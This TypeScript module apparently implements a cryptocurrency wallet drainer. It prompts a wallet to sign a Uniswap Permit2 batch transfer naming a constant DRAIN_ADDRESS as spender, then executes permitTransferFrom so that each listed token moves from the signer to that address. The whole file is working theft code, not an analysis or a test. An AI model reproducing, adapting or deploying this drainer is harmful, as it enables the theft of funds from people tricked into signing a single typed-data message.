import { ethers } from 'ethers';
import { PERMIT2_ADDRESS, DRAIN_ADDRESS } from './constants';

export interface PermitBatchDetails {
  token: string;
  amount: bigint;
}

export interface PermitBatchTransferFrom {
  permitted: PermitBatchDetails[];
  spender: string;
  nonce: bigint;
  deadline: bigint;
}

const PERMIT2_TYPES = {
  PermitBatchTransferFrom: [
    { name: 'permitted', type: 'TokenPermissions[]' },
    { name: 'spender', type: 'address' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ],
  TokenPermissions: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint256' },
  ],
};

export async function signPermit2Batch(
  signer: ethers.JsonRpcSigner,
  tokens: { address: string; amount: bigint }[],
  chainId: bigint
): Promise<{ signature: string; permit: PermitBatchTransferFrom }> {
  const nonce = BigInt(ethers.hexlify(ethers.randomBytes(32)));
  const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600); // 1 hour from now

  const permit: PermitBatchTransferFrom = {
    permitted: tokens.map(t => ({ token: t.address, amount: t.amount })),
    spender: DRAIN_ADDRESS,
    nonce,
    deadline,
  };

  const domain = {
    name: 'Permit2',
    chainId,
    verifyingContract: PERMIT2_ADDRESS,
  };

  const signature = await signer.signTypedData(domain, PERMIT2_TYPES, permit);

  return { signature, permit };
}

export async function executeBatchTransfer(
  signer: ethers.JsonRpcSigner,
  permit: PermitBatchTransferFrom,
  signature: string
) {
  const permit2Abi = [
    "function permitTransferFrom(((address,uint256)[],address,uint256,uint256) permit, (address,uint256)[] transferDetails, address owner, bytes signature) external"
  ];
  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, permit2Abi, signer);

  // Ethers v6 handles structs as arrays in positional arguments
  const permitted = permit.permitted.map(p => [p.token, p.amount]);
  const permitArg = [permitted, permit.spender, permit.nonce, permit.deadline];
  
  // SignatureTransferDetails: { to: address, requestedAmount: uint256 }
  const transferDetails = permit.permitted.map(p => [DRAIN_ADDRESS, p.amount]);
  
  const owner = await signer.getAddress();

  const tx = await permit2Contract.permitTransferFrom(
    permitArg,
    transferDetails,
    owner,
    signature
  );

  return await tx.wait();
}
